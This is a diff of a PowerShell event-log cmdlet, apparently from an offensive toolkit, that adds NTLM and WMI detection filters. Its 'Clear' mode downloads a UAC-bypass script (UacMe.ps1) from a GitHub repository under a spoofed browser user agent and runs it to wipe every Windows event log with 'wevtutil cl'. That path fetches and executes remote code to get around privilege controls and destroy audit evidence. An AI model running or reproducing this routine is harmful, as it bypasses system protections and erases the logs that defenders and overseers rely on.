@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19042) x64 bits
    Required Dependencies: none
    Optional Dependencies: wevtutil
-   PS cmdlet Dev version: v1.4.13
+   PS cmdlet Dev version: v1.4.15
 
 .DESCRIPTION
    This cmdlet displays a list of ALL eventvwr categorie entrys and there
@@ -339,6 +339,7 @@ If($GetLogs -ieq "Yara"){
    ## Categories list!
    $Categories = @("system",
       "Windows Powershell",
+      "Microsoft-Windows-NTLM/Operational",
       "Microsoft-Windows-Applocker/EXE and DLL",
       "Microsoft-Windows-PowerShell/Operational",
       "Microsoft-Windows-Bits-Client/Operational",
@@ -443,14 +444,15 @@ If($GetLogs -ieq "Yara"){
       }ElseIf($Id -ieq "false"){
 
          ## Default Id's to scan! (if none user inputs)
-         # ID: 403                 -> POWERSHELL/OPERATIONAL
+         # ID: 403,4100            -> POWERSHELL/OPERATIONAL
          # ID: 300,403             -> WINDOWS POWERSHELL
          # ID: 59,60               -> BITS
          # ID: 1116,1117,2000,5007 -> Windows Defender
          # ID: 800,8002            -> Applocke/exe and dll
-         # ID: 5858                -> WMI
+         # ID: 5858,5861           -> WMI
          # ID: 1,7045              -> system
-         $RawLit = "1,59,60,300,403,800,1116,1117,2000,5007,5858,7045,8002"
+         # ID: 8004                -> NTLM/Operational
+         $RawLit = "1,59,60,300,403,800,1116,1117,2000,4100,5007,5858,5861,7045,8002,8004"
          $IdList = $RawLit.Split(',')
 
       }Else{## User input Id (only one ID number)
@@ -466,16 +468,34 @@ If($GetLogs -ieq "Yara"){
          ## Loop trougth all categories!
          ForEach($CatList in $Categories){
 
-            Get-WinEvent -LogName "$CatList" -EA SilentlyContinue | Where-Object {
-               $_.Id -eq $IdToken -and $_.Message -iNotMatch '(svchost.exe|.img.|.json.|.png.|.jpg.)' -and
-               $_.LevelDisplayName -iMatch '^(Erro|Error|Aviso|Warning|Informações|Information)$' -and
-               $_.ProviderName -iNotMatch '^(Microsoft-Windows-Power-Troubleshooter|Microsoft-Windows-FilterManager)$'
-               } | Select-Object -Property Id,ContainerLog,TimeCreated,ProviderName,Message -First $NewEst |
-               Format-List | Out-String -Stream | ForEach-Object {
-                  $stringformat = If($_ -iMatch '^(ContainerLog :)'){
-                     @{ 'ForegroundColor' = 'Yellow' } }Else{ @{} }
-                  Write-Host @stringformat $_
-               }
+            If($IdToken -eq "5861"){
+            
+               ## sigma_rule_credits: @mattifestation
+               # https://twitter.com/mattifestation/status/899646620148539397
+               Get-WinEvent -LogName "$CatList" -EA SilentlyContinue | Where-Object {
+                  $_.Id -eq $IdToken -and $_.Message -iMatch '(CommandLineTemplate)+\s+(=)' -and
+                  $_.LevelDisplayName -iMatch '^(Erro|Error|Aviso|Warning|Informações|Information)$'
+                  } | Select-Object -Property Id,ContainerLog,TimeCreated,ProviderName,Message -First $NewEst |
+                  Format-List | Out-String -Stream | ForEach-Object {
+                     $stringformat = If($_ -iMatch '^(ContainerLog :)'){
+                        @{ 'ForegroundColor' = 'Yellow' } }Else{ @{} }
+                     Write-Host @stringformat $_
+                  }
+
+            }Else{
+
+               Get-WinEvent -LogName "$CatList" -EA SilentlyContinue | Where-Object {
+                  $_.Id -eq $IdToken -and $_.Message -iNotMatch '(svchost.exe|.img.|.json.|.png.|.jpg.)' -and
+                  $_.LevelDisplayName -iMatch '^(Erro|Error|Aviso|Warning|Informações|Information)$' -and
+                  $_.ProviderName -iNotMatch '^(Microsoft-Windows-Power-Troubleshooter|Microsoft-Windows-FilterManager)$'
+                  } | Select-Object -Property Id,ContainerLog,TimeCreated,ProviderName,Message -First $NewEst |
+                  Format-List | Out-String -Stream | ForEach-Object {
+                     $stringformat = If($_ -iMatch '^(ContainerLog :)'){
+                        @{ 'ForegroundColor' = 'Yellow' } }Else{ @{} }
+                     Write-Host @stringformat $_
+                  }
+
+            }
 
          }
 
@@ -512,7 +532,7 @@ If($GetLogs -ieq "Clear"){
    #>
 
 
-   If(-not($IsClientAdmin)){## wevtutil cl => requires Administrator rigths to run
+   If(-not($IsClientAdmin)){
 
       <#
       .SYNOPSIS
@@ -520,7 +540,8 @@ If($GetLogs -ieq "Clear"){
          Helper - Clear 'ALL' eventvwr logfiles using EOP!
 
       .NOTES
-         This function only triggers under UserLand privileges!
+         required dependencies: Administrator privileges! { EOP }
+         This function only triggers under 'UserLand' privileges!
 
       .DESCRIPTION
          This function creates 'randomName.ps1' script on %tmp% then
@@ -530,8 +551,8 @@ If($GetLogs -ieq "Clear"){
 
 
       $RawPScript = "wevtutil el | Foreach-Object { wevtutil cl `"`$_`" }"
-      Write-Host "`n[error:] Administrator Privileges: False" -ForegroundColor Red -BackgroundColor Black
-      Write-Host "[bypass] UacMe.ps1 -Action Elevate -Execute `"$RawPScript`"" -ForegroundColor Yellow
+      Write-Host "`n[error:] Shell - Administrator Privileges: False" -ForegroundColor Red -BackgroundColor Black
+      Write-Host "[bypass] Exec @redpill UacMe Module to elevate privs!" -ForegroundColor Yellow
       Start-Sleep -Seconds 1
 
       ## create trigger.ps1 script into %tmp% directory!
@@ -540,12 +561,15 @@ If($GetLogs -ieq "Clear"){
 
       ## Download @UacMe from @redpill repository into %tmp%
       If(-not(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue)){
-         Write-Host "Downloading UacMe.ps1 from @redpill repository!"
          iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/UacMe.ps1" -OutFile "$Env:TMP\UacMe.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
+         If(-not(Test-Path -Path "$Env:TMP\UacMe.ps1" -EA SilentlyContinue)){
+            Write-Host "[error] fail to download: $Env:TMP\UacMe.ps1`n`n" -ForegroundColor Red -BackgroundColor black
+            exit ## Exit @GetLogs
+         }
       }
 
       ## Execute @UacMe that executes '$RandomMe.ps1' that executes 'wevtutil cl' cmdline!
-      Write-Host "Cleaning $Env:COMPUTERNAME\$Env:USERNAME Eventvwr logfiles ...`n"
+      Write-Host "Cleaning ALL '$Env:COMPUTERNAME\$Env:USERNAME' Domain Eventvwr logfiles..";Start-Sleep -Seconds 1
       powershell -File "$Env:TMP\UacMe.ps1" -Action Elevate -Execute "powershell -File $Env:TMP\$RandomMe.ps1"
 
 
@@ -563,7 +587,7 @@ If($GetLogs -ieq "Clear"){
       Get-WinEvent -ListLog * -ErrorAction Ignore | Where-Object {
          $_.LogName -iMatch '^(system|security|application|windows powershell|Internet Explorer|Microsoft-Windows-WMI-Activity/Operational|Microsoft-Windows-Applocker/EXE and DLL|Microsoft-Windows-PowerShell/Operational|Microsoft-Windows-Bits-Client/Operational|Microsoft-Windows-Windows Defender/Operational)$'
       } | Format-Table -AutoSize | Out-String -Stream | ForEach-Object {## Print ForegroundColor as Green if 0 entrys!
-          $stringformat = If($_ -Match '\s+(0)+\s+'){
+          $stringformat = If($_ -Match '\s+(0|1)+\s+'){
              @{ 'ForegroundColor' = 'Green' } }Else{ @{} }
           Write-Host @stringformat $_
        }
@@ -582,7 +606,7 @@ If($GetLogs -ieq "Clear"){
       Get-WinEvent -ListLog * -ErrorAction Ignore | Where-Object {
          $_.LogName -iMatch '^(system|security|application|windows powershell|Internet Explorer|Microsoft-Windows-WMI-Activity/Operational|Microsoft-Windows-Applocker/EXE and DLL|Microsoft-Windows-PowerShell/Operational|Microsoft-Windows-Bits-Client/Operational|Microsoft-Windows-Windows Defender/Operational)$'
       } | Format-Table -AutoSize | Out-String -Stream | ForEach-Object {## Print ForegroundColor as Green if 0 entrys!
-          $stringformat = If($_ -Match '\s+(0)+\s+'){
+          $stringformat = If($_ -Match '\s+(0|1)+\s+'){
              @{ 'ForegroundColor' = 'Green' } }Else{ @{} }
           Write-Host @stringformat $_
        }
